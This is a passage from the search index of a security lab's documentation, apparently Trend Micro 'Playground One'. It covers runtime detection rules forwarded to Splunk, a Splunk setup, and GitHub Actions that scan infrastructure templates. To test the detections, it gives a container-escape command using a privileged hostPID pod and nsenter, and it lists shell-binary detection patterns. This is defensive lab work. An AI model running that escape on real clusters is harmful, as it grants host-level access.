= execve and evt.dir=&lt; and container.id != host and proc.name in (information_gathering_tools)\n  output: \"Information gathering tool run in container (user=%user.name %container.info parent=%proc.pname cmdline=%proc.cmdline)\"\n  priority: WARNING\nEOF\n</code></pre> <p>This rule will trigger, when you run the command <code>whoami</code> inside of a container. Nothing serious, but it should show how it works.</p> <p>After changing back to our working directory with</p> <pre><code>cd ${ONEPATH}/customrules\n</code></pre> <p>we create an additional overrides file which enables custom rules in Container Security. Run</p> <pre><code>splunk_http_event_collector=http://&lt;IP address of your docker host&gt;:8088\nsplunk_token_value=&lt;Token Value from the previous step&gt;\n# Example:\n# splunk_http_event_collector=http://192.168.1.122:8088\n# splunk_token_value=e21a2ff0-3c17-4be7-9871-2417f3c9e19f\n\ncat &lt;&lt;EOF &gt;./overrides-custom-rules.yaml\ncloudOne:\n  runtimeSecurity:\n    enabled: true\n    customRules:\n      enabled: true\n      output:\n        json: true\n        splunk:\n          url: ${splunk_http_event_collector}/services/collector/raw\n          headers:\n          - \"Authorization: Splunk ${splunk_token_value}\"\nEOF\n</code></pre> <p>Now, upgrade the helm deployment of Container Security in your cluster. Run:</p> <pre><code>helm get values --namespace trendmicro-system container-security | \\\n  helm upgrade container-security \\\n    --namespace trendmicro-system \\\n    --values - \\\n    --values overrides-custom-rules.yaml \\\n    cloudone-container-security-helm-2.3.38\n</code></pre> <p>The above basically reads out the current values of the Container Security deployment, adds our overrides to enable custom rules, and upgrades the deployment.</p> <p>Example upgrade output:</p> <pre><code>Release \"container-security\" has been upgraded. Happy Helming!\nNAME: container-security\nLAST DEPLOYED: Tue Jun 11 12:37:39 2024\nNAMESPACE: trendmicro-system\nSTATUS: deployed\nREVISION: 13\nTEST SUITE: None\n</code></pre>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-custom-rules/#testing-it","title":"Testing it...","text":"<p>Now, let's test what we did. We're quickly creating a shell in our Kubernetes cluster here:</p> <pre><code>kubectl run -it --image=ubuntu shell --restart=Never --rm -- /bin/bash\n</code></pre> <p>It's just a simple Ubuntu shell what you should get, but it runs as a Pod on your cluster.</p> <pre><code>If you don't see a command prompt, try pressing enter.\nroot@shell:/# \n</code></pre> <p>Now, run the command <code>whomi</code> which will tell you, that you're <code>root</code> :-).</p> <pre><code>root@shell:/# whoami\nroot\n</code></pre> <p>Now, back to Splunk...</p> <p>Navigate to <code>Search &amp; Reporting &gt;</code></p> <p></p> <p>As the <code>Search</code> query type:</p> <pre><code>source=\"http:V1CS Custom Rule Events\" index=\"v1cs_custom_rule_events\"\n</code></pre> <p></p> <p>This should reveal our information gathering attempt...</p> <p></p> <p>Look for <code>proc.cmdline=</code>.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-custom-rules/#some-other-custom-rules-you-can-play-with","title":"Some other Custom Rules You can Play with","text":"<p>Simply append the yamls below to your <code>/config/customrules/playground_rules.yaml</code>.</p> <pre><code># ################################################################################\n# Container Escape\n# ################################################################################\n- macro: is_kind\n  condition: container.image startswith \"kindest/node:\"\n\n# Container Escape with nsenter\n# Not 100% sure about the deltatime thing\n# Runnig a nsenter -t 1 -m -u -i -n bash will result in four findings if no\n# deltatime is defined. \n- rule: (PG-ESC) Detect Container Escape (nsenter)\n  desc: Detect a container escape using nsenter\n  condition: &gt;\n    evt.type = setns\n    and container\n    and container.privileged=true\n    and container.image != \"\"\n    and evt.deltatime &gt; 8000\n    and not is_kind\n  output: &gt;\n    The command nsenter was used to run a process within the name spaces of another process from within a container\n    (user=%user.name command=%proc.cmdline parent=%proc.pname pcmdline=%proc.pcmdline gparent=%proc.aname[2]\n    container=%container.name image=%container.image)\n  priority: ERROR\n  tags: [escape]\n</code></pre> <p>And don't forget to upgrade the helm deployment of Container Security in your cluster.</p> <pre><code>helm get values --namespace trendmicro-system container-security | \\\n  helm upgrade container-security \\\n    --namespace trendmicro-system \\\n    --values - \\\n    --values overrides-custom-rules.yaml \\\n    cloudone-container-security-helm-2.3.38\n</code></pre> <p>Exploit Container Escape with <code>nsenter</code>:</p> <p>Start a privileged container in Kubernetes:</p> <pre><code>kubectl run -it --image=alpine s --restart=Never --rm --overrides '{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"shell\",\"image\":\"alpine\",\"stdin\":true,\"tty\":true,\"command\":[\"/bin/sh\"],\"securityContext\":{\"privileged\":true}}]}}'\n</code></pre> <p>From within the container run: <code>nsenter -t 1 -m -u -i -n sh</code></p> <p>With the below we're detecting if a shell is created within a pod, whereby we differentiate if it is a root-shell or a regular user shell.</p> <pre><code># ################################################################################\n# Shell Usage in Container\n# ################################################################################\n- macro: spawned_process\n  condition: (evt.type in (execve, execveat) and evt.dir=&lt;)\n\n- list: shell_binaries\n  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]\n\n- macro: shell_procs\n  condition: (proc.name in (shell_binaries))\n\n# Detect attach/exec with terminal shell as root or user\n- macro: is_user_shell\n  condition: (proc.vpid!=1 and user.uid!=0)\n\n- macro: is_root_shell\n  condition: (proc.vpid!=1 and user.uid=0)\n\n- rule: (PG-SHELL) Attach/Exec Pod with Terminal User shell in container\n  desc: A shell was created inside an unprivileged container with an attached terminal.\n  condition: &gt;\n    spawned_process and container\n    and shell_procs and proc.tty != 0\n    and is_user_shell\n  output: &gt;\n    A shell was spawned in a container with an attached terminal (user=%user.name user_loginuid=%user.loginuid %container.info\n    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository)\n  priority: WARNING\n  tags: [container, shell, mitre_execution]\n  enabled: true\n\n- rule: (PG-SHELL) Attach/Exec Pod with Terminal Root shell in container\n  desc: A shell was created inside a container which runs as root user with an attached terminal.\n  condition: &gt;\n    spawned_process and container\n    and shell_procs and proc.tty != 0\n    and is_root_shell\n  output: &gt;\n    A shell with root privileges was spawned in a container running as root with an attached terminal (user=%user.name\n    user_loginuid=%user.loginuid %container.info shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty\n    container_id=%container.id image=%container.image.repository)\n  priority: WARNING\n  tags: [container, shell, mitre_execution]\n  enabled: true\n</code></pre> <p>Trigger:</p> <p>Find a Pod you want a shell in</p> <pre><code>kubectl get pods -A\n</code></pre> <p>and then try to open a shell with</p> <pre><code>kubectl exec -it -n &lt;NAMESPACE&gt; &lt;POD&gt; -- /bin/sh\n</code></pre>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-xdr/","title":"Integrate Splunk with Vision One XDR","text":"<p>DRAFT</p>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-xdr/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>Completed Scenario Splunk Setup</li> </ul>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-xdr/#install-the-trend-vision-one-for-splunk-xdr-app","title":"Install the Trend Vision One for Splunk (XDR) App","text":"<p>Navigate to <code>Apps -&gt; Manage Apps</code> in the top left of your Splunk frontent. Click on the green <code>[Browse more apps]</code> button in the top right afterwards.</p> <p>Now, type <code>trend micro</code> in the search bar at the top left and press <code>[Enter]</code>.</p> <p>You should see seven apps as the result, whereby one is <code>Trend Vision One for Splunk (XDR)</code>.</p> <p></p> <p>Click the green <code>[Install]</code>-button.</p> <p>In the next dialog you will be prompted to enter your personal user credentials of your Splunk account:</p> <p></p> <p>You will be promped to restart Splunk. After the successful restart you should see the XDR App as shown below.</p> <p></p>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-xdr/#connect-splunk-to-vision-one","title":"Connect Splunk to Vision One","text":"<p>The XDR App will pull data from Vision One. To allow this we need to head over to Vision One and create an API Key for your Splunk instance.</p> <p>In Vision One head over to <code>Workflow and Automation -&gt; Third-Party Ingegration</code> and filter for <code>Splunk</code> in the vendors section. This should filter on four available integration variants. Choose <code>Splunk XDR</code> in this case.</p> <p></p> <p>Click on <code>[Generate]</code> and in the <code>Add API Key</code>-dialog on <code>[Add]</code>.</p> <p>Save the generated API Key in a secure location.</p> <p>Next, go back to your Splunk and the XDR App we just installed. In the apps menu select <code>Configuration</code> and click on the pencil button of the <code>default_account</code>.</p> <p></p> <p>As URL type <code>https://api.xdr.trendmicro.com</code> for an US instance of Vision One. Adapt the URL if your instance is located in another region (see FAQ).</p> <p>As the <code>Authentication token</code> paste the API Key generated in Vision One beforehand.</p> <p></p> <p>Click <code>[Update]</code>.</p> <p>From now on, any new Workbench Alerts and OATs should show up in Splunk.</p>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-xdr/#optional-generate-detections-locally","title":"(Optional) Generate Detections Locally","text":"<p>If you want to automatically generate Workbenches and OATs deploy any of the provided Scenario configurations of Playground One (EKS with EC2 or Fargate, or Kind).</p> <p>Below, how to do this using the built in Kind cluster:</p> <p>Prerequisite: Vision One Container Security configured in Playground One configuration.</p> <pre><code>pgo --init kind\npgo --apply kind\npgo --apply scenarios-kind\n</code></pre> <p>The Kind scenarios will generate findings every full hour.</p> <p></p>"},{"location":"scenarios/bigdata/splunk-setup/","title":"Get Splunk Up and Running Locally","text":"<p>DRAFT</p>"},{"location":"scenarios/bigdata/splunk-setup/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> </ul>"},{"location":"scenarios/bigdata/splunk-setup/#install-compose-if-required","title":"Install Compose (if required)","text":"<p>Use the following command to download:</p> <pre><code>mkdir -p ~/.docker/cli-plugins/\ncurl -SL https://github.com/docker/compose/releases/download/v2.3.3/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>Next, set the correct permissions so that the docker compose command is executable:</p> <pre><code>chmod +x ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>To verify that the installation was successful, you can run:</p> <pre><code>docker compose version\n</code></pre> <p>You\u2019ll see output similar to this:</p> <pre><code>Output\nDocker Compose version v2.3.3\n</code></pre> <p>Docker Compose is now successfully installed on your system. In the next section, you\u2019ll see how to set up a <code>docker-compose.yaml</code> file and get a containerized environment up and running with this tool.</p>"},{"location":"scenarios/bigdata/splunk-setup/#start-splunk","title":"Start Splunk","text":"<p>First, change to the working directory.</p> <pre><code># Change to working directory\ncd ${ONEPATH}/stacks/splunk\n</code></pre> <p>Feel free to review the files, especially the <code>docker-compose.yaml</code> which creates the stack.</p> <p>Now run</p> <pre><code>docker compose up\n</code></pre> <p>This will prepare a Splunk Free, which can process up to 500MB per day.</p> <p>The first startup requires some minutes to complete.</p> <p>Try to access your Splunk instance at http://localhost:8000 and use the following credentials:</p> <ul> <li>Username: <code>admin</code></li> <li>Password: <code>TrendMicro.1</code></li> </ul> <p>Detached Mode</p> <p>If you want to run the stack continuously restart the stack but append <code>-d</code> to activate detached mode.</p> <p><code>docker compose up -d</code></p>"},{"location":"scenarios/bigdata/splunk-setup/#have-a-splunk-user-account","title":"Have a Splunk User Account","text":"<p>To be able to download Add-Ons for your Splunk you need to own a free Splunk user account. If you don't already have one, create it here.</p>"},{"location":"scenarios/bigdata/splunk-setup/#tear-down-splunk","title":"Tear Down Splunk","text":"<p>If you at some point want to delete your Splunk instance run the following command:</p> <pre><code>docker compose -v\n</code></pre> <p>This will remove all containers, volumes, and the network.</p>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/","title":"Scenario: CloudFormation IaC Scanning as GitHub Action","text":"<p>DRAFT</p> <p>Warning!</p> <p>This scenario does use Cloud One Conformity!</p>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#prerequisites","title":"Prerequisites","text":"<ul> <li>Clouud One API-Key with the following permissions:<ul> <li>Conformity<ul> <li>PowerUser</li> </ul> </li> </ul> </li> <li>GitHub Account.</li> <li>Forked playground-one-template-scanner.</li> </ul>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#about-github-actions","title":"About GitHub Actions","text":"<p>GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline on GitHub.</p> <p>GitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.</p> <p>You can configure a GitHub Actions workflow to be triggered when an event occurs in your repository, such as a pull request being opened, an issue being created or a push happened. Your workflow contains one or more jobs which can run in sequential order or in parallel. Each job will run inside its own virtual machine runner, or inside a container, and has one or more steps that either run a script that you define or run an action, which is a reusable extension that can simplify your workflow.</p> <p>Workflows are defined as YAML files in the .github/workflows directory in a repository, and a repository can have multiple workflows, each of which can perform a different set of tasks.</p> <p>In this scenario we're going to create a workflow to automatically build, push and scan a container image with Trend Micro Artifact Scanning. The scan will check the image for vulnerabilities and malware and eventually push it to the registry.</p> <p>The logic implemented in this Action template is as follows:</p> <ul> <li>Prepare the Docker Buildx environment.</li> <li>Build the image and save it as a tar ball.</li> <li>Scan the built image for vulnerabilities and malware using Vision One Container Security.</li> <li>Upload Scan Result and SBOM Artifact if available. Artifacts allow you to share data between jobs in a workflow and store data once that workflow has completed, in this case saving the scan result and the container image SBOM as an artifact allow you to have proof on what happened on past scans.</li> <li>Optionally fail the workflow if malware and/or the vulnerability threshold was reached. Failing the workflow at this stage prevents the registry to get polluted with insecure images.</li> <li>Authenticate to the deployment registry.</li> <li>Rebuild the image from cache for the desired architectures.</li> <li>Push the image to the registry.</li> <li>Rescan the image in the registry to allow proper admission control integration.</li> </ul>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#fork-the-scenario-repo","title":"Fork the Scenario Repo","text":"<p>The first step is to fork the scenarios GitHub repo. For this go to github.com and sign in or create a free account if you need to.</p> <p>Next, you want to create a Fork of the scenarios repo. A fork is basically a copy of a repository. Forking a repository allows you to freely experiment with changes without affecting the original project.</p> <p>To do this navigate to the repo playground-one-template-scanner and click on the <code>Fork</code>-button in the upper right.</p> <p>On the next screen you change the name to something shorter like <code>action</code>. Then press <code>[Create fork]</code> which will bring you back to your account.</p>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#the-repo","title":"The Repo","text":"<p>The repo containes a hidden directory <code>.github/workflows</code> with some <code>yaml</code>-files, a <code>cfn</code> and an <code>infra</code>-directory.</p> <p>The <code>cfn</code> holds an example CloudFormation template for the scan, whereby the <code>infra</code> directory contains some Terraform modules which would create a VPC, subnets, security groups, etc.</p>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#the-workflow","title":"The Workflow","text":"<p>In the following section we'll review the different GitHub Actions for CloudFormation scanning of this repo.</p> <p>Let's go through it.</p> <pre><code>name: CloudFormation Scan\n\n# A push --tags on the repo triggers the workflow\non:\n  push:\n    tags: [ v* ]\n\nenv:\n  # Conformity API Key\n  CLOUD_ONE_API_KEY: ${{ secrets.API_KEY }}\n\n  # Region in which Cloud Conformity serves your organisation\n  CLOUD_ONE_REGION: eu-central-1\n\n  # Scan result threshold (fail on risk-level or higher)\n  # THRESHOLD: any\n  # THRESHOLD: critical\n  THRESHOLD: high\n  # THRESHOLD: medium\n  # THRESHOLD: low\n\njobs:\n  docker:\n    runs-on: ubuntu-latest\n\n    steps:\n      # Prepare and authenticate to AWS using the given credentials\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: ${{ secrets.AWS_REGION }}\n\n      # CloudFormation scan\n      - name: CloudFormation Scan\n        run: |\n          contents=$(cat cfn/template.json | jq '.' -MRs)\n          payload=\"{\\\"data\\\":{\\\"attributes\\\":{\\\"type\\\":\\\"cloudformation-template\\\",\\\"contents\\\":${contents}}}}\"\n          printf '%s' ${payload} &gt; data.txt\n\n          # # Scan template\n          curl -s -X POST \\\n              -H \"Authorization: ApiKey ${CLOUD_ONE_API_KEY}\" \\\n              -H \"Content-Type: application/vnd.api+json\" \\\n              https://${CLOUD_ONE_REGION}-api.cloudconformity.com/v1/template-scanner/scan \\\n              -d @data.txt &gt; result.json\n\n          # Extract findings risk-level\n          risk_levels=$(cat result.json | jq -r '.data[] | select(.attributes.status == \"FAILURE\") | .attributes.\"risk-level\"')\n\n          fail=0\n          [ \"${THRESHOLD}\" = \"any\" ] &amp;&amp; \\\n            [ ! -z \"${risk_levels}\" ] &amp;&amp; fail=1\n\n          [ \"${THRESHOLD}\" = \"critical\" ] &amp;&amp; \\\n            [[ ${risk_levels} == *CRITICAL* ]] &amp;&amp; fail=2\n\n          [ \"${THRESHOLD}\" = \"high\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]]) &amp;&amp; fail=3\n\n          [ \"${THRESHOLD}\" = \"medium\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]]) &amp;&amp; fail=4\n\n          [ \"${THRESHOLD}\" = \"low\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]] || [[ ${risk_levels} == *LOW* ]]) &amp;&amp; fail=5\n\n          [ $fail -ne 0 ] &amp;&amp; echo !!! Threshold exceeded !!! &gt; exceeded || true\n          rm -f data.txt\n\n      # Upload Scan Result if available\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: scan-result\n          path: result.json\n          retention-days: 30\n\n      # Fail the workflow if theshold reached\n      - name: Fail Scan\n        run: |\n          ls -l\n          if [ -f \"exceeded\" ]; then exit 1; fi\n</code></pre>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#secrets","title":"Secrets","text":"<p>For simplicity, authentication to AWS is done via access and secret access key. Alternative and likely better variants are described here.</p> <p>The workflow requires a secret to be set. For that navigate to <code>Settings --&gt; Security --&gt; Secrets and variables --&gt; Actions --&gt; Secrets</code>.</p> <p>Add the following secrets:</p> <ul> <li>API_KEY: <code>&lt;Your Cloud One API Key&gt;</code></li> <li>AWS_ACCESS_KEY_ID</li> <li>AWS_SECRET_ACCESS_KEY</li> </ul>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#template","title":"Template","text":"<p>Adapt the environment variables in the <code>env:</code>-section as required.</p> Variable Purpose <code>CLOUD_ONE_REGION</code> Cloud One Region of choice (e.g. eu-central-1, us-west-2, etc.). <code>THRESHOLD</code> Defines the fail condition of the action in relation to discovered vulnerabilities. A threshold of <code>critical</code> does allow any number of vulnerabilities up to the criticality <code>high</code>. <p>Allowed values for the <code>THRESHOLD</code> are:</p> <ul> <li><code>any</code>: No vulnerabilities allowed.</li> <li><code>critical</code>: Max risk-level of discovered findings is <code>high</code>.</li> <li><code>high</code>: Max risk-level of discovered findings is <code>medium</code>.</li> <li><code>medium</code>: Max risk-level of discovered findings is <code>low</code>.</li> <li><code>low</code>: Max risk-level of discovered findings is <code>negligible</code>.</li> </ul> <p>If the <code>THRESHOLD</code> is not set, vulnerabilities will not fail the pipeline.</p> <p>The workflow will trigger on <code>git push --tags</code>.</p>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#actions","title":"Actions","text":"<p>Navigate to <code>Actions</code> and enable Workflows for the forked repository.</p>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#test-it","title":"Test it","text":""},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#create-a-tag","title":"Create a Tag","text":"<p>To trigger the action we simply create a tag.</p> <p>Navigate to <code>Releases</code> on the right and then click on <code>[Draft a new release]</code>.</p> <p>Next, click on <code>[Choose a tag]</code> and type <code>v0.1</code>. A new button called <code>[Create new tag]</code> should get visible. Click on it.</p> <p>Leave the rest as it is and finally click on the green button <code>[Publish release]</code>. This will trigger the action workflow.</p> <p>CLI: <code>git tag v0.1 &amp;&amp; git push --tags</code></p>"},{"location":"scenarios/cspm/template-scanning-cfn-github-action/#check-the-action","title":"Check the Action","text":"<p>Now, navigate to the tab <code>Actions</code> and review the actions output. Click on <code>CloudFormation Scan</code>.</p> <p>You should now see three main sections:</p> <ol> <li><code>cloudformation-template-scan-shell.yaml</code>: Clicking on <code>docker</code> reveals the output of the steps from the workflow (and where it failed).</li> <li>Annotations: Telling you in this case that the process completed with exit code 1.</li> <li>Artifacts: These are the artifacts created by the action. There should be a <code>scan-result</code>.</li> </ol> <p>Feel free to review the scan results to find out why the action did fail.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/","title":"Scenario: Terraform IaC Scanning as GitHub Action","text":"<p>DRAFT</p> <p>Warning!</p> <p>This scenario does use Cloud One Conformity!</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#prerequisites","title":"Prerequisites","text":"<ul> <li>Clouud One API-Key with the following permissions:<ul> <li>Conformity<ul> <li>PowerUser</li> </ul> </li> </ul> </li> <li>GitHub Account.</li> <li>Forked playground-one-template-scanner.</li> </ul>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#about-github-actions","title":"About GitHub Actions","text":"<p>GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline on GitHub.</p> <p>GitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.</p> <p>You can configure a GitHub Actions workflow to be triggered when an event occurs in your repository, such as a pull request being opened, an issue being created or a push happened. Your workflow contains one or more jobs which can run in sequential order or in parallel. Each job will run inside its own virtual machine runner, or inside a container, and has one or more steps that either run a script that you define or run an action, which is a reusable extension that can simplify your workflow.</p> <p>Workflows are defined as YAML files in the .github/workflows directory in a repository, and a repository can have multiple workflows, each of which can perform a different set of tasks.</p> <p>In this scenario we're going to create a workflow to automatically build, push and scan a container image with Trend Micro Artifact Scanning. The scan will check the image for vulnerabilities and malware and eventually push it to the registry.</p> <p>The logic implemented in this Action template is as follows:</p> <ul> <li>Prepare the Docker Buildx environment.</li> <li>Build the image and save it as a tar ball.</li> <li>Scan the built image for vulnerabilities and malware using Vision One Container Security.</li> <li>Upload Scan Result and SBOM Artifact if available. Artifacts allow you to share data between jobs in a workflow and store data once that workflow has completed, in this case saving the scan result and the container image SBOM as an artifact allow you to have proof on what happened on past scans.</li> <li>Optionally fail the workflow if malware and/or the vulnerability threshold was reached. Failing the workflow at this stage prevents the registry to get polluted with insecure images.</li> <li>Authenticate to the deployment registry.</li> <li>Rebuild the image from cache for the desired architectures.</li> <li>Push the image to the registry.</li> <li>Rescan the image in the registry to allow proper admission control integration.</li> </ul>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#fork-the-scenario-repo","title":"Fork the Scenario Repo","text":"<p>The first step is to fork the scenarios GitHub repo. For this go to github.com and sign in or create a free account if you need to.</p> <p>Next, you want to create a Fork of the scenarios repo. A fork is basically a copy of a repository. Forking a repository allows you to freely experiment with changes without affecting the original project.</p> <p>To do this navigate to the repo playground-one-template-scanner and click on the <code>Fork</code>-button in the upper right.</p> <p>On the next screen you change the name to something shorter like <code>action</code>. Then press <code>[Create fork]</code> which will bring you back to your account.</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#the-repo","title":"The Repo","text":"<p>The repo containes a hidden directory <code>.github/workflows</code> with some <code>yaml</code>-files, a <code>cfn</code> and an <code>infra</code>-directory.</p> <p>The <code>cfn</code> holds an example CloudFormation template for the scan, whereby the <code>infra</code> directory contains some Terraform modules which would create a VPC, subnets, security groups, etc.</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#the-workflows","title":"The Workflows","text":"<p>In the following section we'll review the different GitHub Actions of this repo.</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#terraform-scan-using-shell","title":"Terraform Scan using Shell","text":"<p>The <code>terraform-template-scan-shell.yaml</code>-file in <code>.github/workflows</code> will run a scan on the provided Terraform infrastructure.</p> <p>Important to understand is, that the scan will actually scan the Terraform plan which is effectively the execution plan Terraform would do when the configuration would be applied. It therefore requires valid authentication credentials to the cloud and will only contain the actions to match the desired state as defined in the configuration.</p> <p>By default, when Terraform creates a plan it:</p> <ul> <li>Reads the current state of any already-existing remote objects to make sure that the Terraform state is up-to-date.</li> <li>Compares the current configuration to the prior state and noting any differences.</li> <li>Proposes a set of change actions that should, if applied, make the remote objects match the configuration.</li> </ul> <p>The plan command alone does not actually carry out the proposed changes, but the plan is what is scanned by Conformity.</p> <p>Let's go through it.</p> <pre><code>name: Terraform Scan Shell\n\n# A push --tags on the repo triggers the workflow\non:\n  push:\n    tags: [ v* ]\n\nenv:\n  # Conformity API Key\n  CLOUD_ONE_API_KEY: ${{ secrets.API_KEY }}\n\n  # Region in which Cloud Conformity serves your organisation\n  CLOUD_ONE_REGION: eu-central-1\n\n  # Scan result threshold (fail on risk-level or higher)\n  # THRESHOLD: any\n  # THRESHOLD: critical\n  THRESHOLD: high\n  # THRESHOLD: medium\n  # THRESHOLD: low\n\njobs:\n  docker:\n    runs-on: ubuntu-latest\n\n    steps:\n      # Prepare and authenticate to AWS using the given credentials\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: ${{ secrets.AWS_REGION }}\n\n      # Install Terraform\n      - name: Terraform Install\n        run: |\n          wget -O- https://apt.releases.hashicorp.com/gpg | \\\n            gpg --dearmor | \\\n            sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg &gt; /dev/null\n          echo \"deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \\\n            https://apt.releases.hashicorp.com $(lsb_release -cs) main\" | \\\n            sudo tee /etc/apt/sources.list.d/hashicorp.list\n          sudo apt-get update\n          sudo apt-get install -y terraform\n\n      # Terraform plan\n      - name: Terraform Plan\n        run: |\n          # IaC code in\n          iac=infra\n\n          # Create the plan\n          cd ${iac}\n          terraform init\n          terraform plan -var=\"account_id=${{ secrets.AWS_ACCOUNT_ID }}\" -var=\"aws_region=${{ secrets.AWS_REGION }}\" -out=plan.out\n          terraform show -json plan.out &gt; ../plan.json\n          rm -f plan.out\n          cd ..\n\n      # Terraform scan\n      - name: Terraform Scan\n        run: |\n          # Create scan payload\n          contents=$(cat plan.json | jq '.' -MRs)\n          payload=\"{\\\"data\\\":{\\\"attributes\\\":{\\\"type\\\":\\\"terraform-template\\\",\\\"contents\\\":${contents}}}}\"\n          printf '%s' ${payload} &gt; data.txt\n\n          # Scan template\n          curl -s -X POST \\\n              -H \"Authorization: ApiKey ${CLOUD_ONE_API_KEY}\" \\\n              -H \"Content-Type: application/vnd.api+json\" \\\n              https://${CLOUD_ONE_REGION}-api.cloudconformity.com/v1/template-scanner/scan \\\n              -d @data.txt &gt; result.json\n\n          # Extract findings risk-level\n          risk_levels=$(cat result.json | jq -r '.data[] | select(.attributes.status == \"FAILURE\") | .attributes.\"risk-level\"')\n\n          fail=0\n          [ \"${THRESHOLD}\" = \"any\" ] &amp;&amp; \\\n            [ ! -z \"${risk_levels}\" ] &amp;&amp; fail=1\n\n          [ \"${THRESHOLD}\" = \"critical\" ] &amp;&amp; \\\n            [[ ${risk_levels} == *CRITICAL* ]] &amp;&amp; fail=2\n\n          [ \"${THRESHOLD}\" = \"high\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]]) &amp;&amp; fail=3\n\n          [ \"${THRESHOLD}\" = \"medium\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]]) &amp;&amp; fail=4\n\n          [ \"${THRESHOLD}\" = \"low\" ] &amp;&amp; \\\n            ([[ ${risk_levels} == *CRITICAL* ]] || [[ ${risk_levels} == *HIGH* ]] || [[ ${risk_levels} == *MEDIUM* ]] || [[ ${risk_levels} == *LOW* ]]) &amp;&amp; fail=5\n\n          [ $fail -ne 0 ] &amp;&amp; echo !!! Threshold exceeded !!! &gt; exceeded || true\n          # rm -f data.txt plan.json\n\n      # Upload Scan Result if available\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: scan-result\n          path: result.json\n          retention-days: 30\n\n      # Fail the workflow if theshold reached\n      - name: Fail Scan\n        run: |\n          ls -l\n          if [ -f \"exceeded\" ]; then exit 1; fi\n</code></pre>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#terraform-scan-using-terraform-plan-action","title":"Terraform Scan using Terraform plan action","text":"<p>This workflow is a variant of the above, simplifying the Terraform install and plan steps. All the rest is identical.</p> <pre><code>...\njobs:\n  docker:\n    runs-on: ubuntu-latest\n\n    steps:\n...\n      # Terraform plan\n      - name: Terraform Plan\n        id: terraform_plan\n        uses: dflook/terraform-plan@v1\n        with:\n          path: infra\n          variables: |\n            account_id=\"${{ secrets.AWS_ACCOUNT_ID }}\"\n            aws_region=\"${{ secrets.AWS_REGION }}\"\n...\n</code></pre> <p>The <code>Terraform Plan</code> step replaces the install and plan steps by using the plan action from Daniel Flook.</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#secrets","title":"Secrets","text":"<p>For simplicity, authentication to AWS is done via access and secret access key. Alternative and likely better variants are described here.</p> <p>The workflow requires a secret to be set. For that navigate to <code>Settings --&gt; Security --&gt; Secrets and variables --&gt; Actions --&gt; Secrets</code>.</p> <p>Add the following secrets:</p> <ul> 